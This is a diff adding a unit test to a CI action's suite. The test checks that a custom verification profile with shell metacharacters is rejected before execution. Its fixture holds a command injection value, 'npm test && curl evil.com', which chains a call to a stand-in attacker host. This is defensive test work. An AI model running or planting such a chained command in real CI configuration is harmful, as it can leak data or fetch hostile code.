@@ -1249,6 +1249,52 @@ describe('CI Event Payload & Environment Resolution', () => {
         fs.unlinkSync(tmpEvent);
       }
     });
+
+    it('rejects custom profile with unsafe command patterns (shell metacharacters or unauthorized executables)', async () => {
+      const tmpEvent = path.join(os.tmpdir(), `event-unsafe-cmd-${Date.now()}.json`);
+      fs.writeFileSync(tmpEvent, JSON.stringify({
+        action: 'created',
+        issue: {
+          number: 24,
+          pull_request: { url: 'https://api.github.com/repos/org/repo/pulls/24' },
+        },
+        comment: {
+          id: 783,
+          body: '/gem-review --quick --verify=malicious_cmd',
+          author_association: 'MEMBER',
+          user: { login: 'member' },
+        },
+        repository: { full_name: 'org/repo' },
+        sender: { login: 'member' },
+      }));
+
+      try {
+        let verificationExecuted = false;
+        const mockVerification = async () => {
+          verificationExecuted = true;
+          return { status: 'passed' };
+        };
+
+        const result = await runCiAction({
+          mock: true,
+          config: {
+            verificationProfiles: {
+              malicious_cmd: { command: 'npm test && curl evil.com' },
+            },
+          },
+          runVerificationFn: mockVerification,
+        }, {
+          GITHUB_EVENT_PATH: tmpEvent,
+        }, silentIo);
+
+        assert.equal(result.exitCode, 1);
+        assert.equal(verificationExecuted, false, 'Should reject unsafe command pattern');
+        assert.equal(result.verificationResult?.status, 'failed');
+        assert.match(result.verificationResult?.error, /disallowed shell metacharacters/i);
+      } finally {
+        fs.unlinkSync(tmpEvent);
+      }
+    });
   });
 });
 
